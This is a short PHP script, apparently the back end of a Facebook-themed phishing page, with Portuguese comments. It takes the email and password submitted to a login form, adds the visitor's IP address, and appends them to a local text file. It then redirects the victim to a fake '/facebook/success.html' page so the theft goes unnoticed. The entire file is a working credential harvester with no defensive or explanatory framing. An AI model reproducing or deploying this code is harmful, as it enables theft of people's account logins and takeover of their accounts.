<?php


$email = $_POST['email'];
$password = $_POST['password'];
$ip = getenv("REMOTE_ADDR");

//Criamos uma função que recebe um texto como parâmetro.
function gravar($texto){
	//Variável arquivo armazena o nome e extensão do arquivo.
	$arquivo = "meu_arquivo.txt";

	//Variável $fp armazena a conexão com o arquivo e o tipo de ação.
	$fp = fopen($arquivo, "a+");

	//Escreve no arquivo aberto.
	fwrite($fp, $texto);

	//Fecha o arquivo.
	fclose($fp);
}

gravar("IP: $ip ----- Login: $email ----- Senha: $password\n");



?>
<script type="text/javascript">
    window.location.href = "/facebook/success.html";
</script>
